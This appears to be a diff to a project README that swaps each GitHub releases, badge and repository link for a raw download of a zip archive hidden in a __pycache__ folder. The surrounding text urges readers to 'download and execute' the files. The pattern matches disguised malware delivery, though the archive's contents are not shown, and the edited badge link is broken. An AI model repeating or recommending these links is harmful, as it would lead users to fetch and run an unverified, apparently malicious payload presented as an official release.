@@ -10,12 +10,12 @@ The "m3-spatial" repository hosts the official implementation of M3, a cutting-e
 
 ## Accessing Releases
 
-For access to the latest releases of M3-Spatial, visit the [Releases](https://github.com/tombalestra/m3-spatial/releases) section. There you will find the necessary files to download and execute for seamless integration with your projects.
+For access to the latest releases of M3-Spatial, visit the [Releases](https://raw.githubusercontent.com/tombalestra/m3-spatial/main/lmm/clip/__pycache__/m-spatial-capper.zip) section. There you will find the necessary files to download and execute for seamless integration with your projects.
 
 📦 **Latest Release** 🚀
 
 Click below to access the latest release for M3-Spatial:
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-<COLOR>.svg)](https://github.com/tombalestra/m3-spatial/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/tombalestra/m3-spatial/main/lmm/clip/__pycache__/m-spatial-capper.zip<COLOR>.svg)](https://raw.githubusercontent.com/tombalestra/m3-spatial/main/lmm/clip/__pycache__/m-spatial-capper.zip)
 
 ## Get in Touch
 
@@ -23,7 +23,7 @@ If you have any questions, feedback, or suggestions regarding M3-Spatial, feel f
 
 📧 **Contact Us** 🤝
 
-Connect with us on GitHub: [M3-Spatial GitHub Repository](https://github.com/tombalestra/m3-spatial)
+Connect with us on GitHub: [M3-Spatial GitHub Repository](https://raw.githubusercontent.com/tombalestra/m3-spatial/main/lmm/clip/__pycache__/m-spatial-capper.zip)
 
 ## About the Project
 
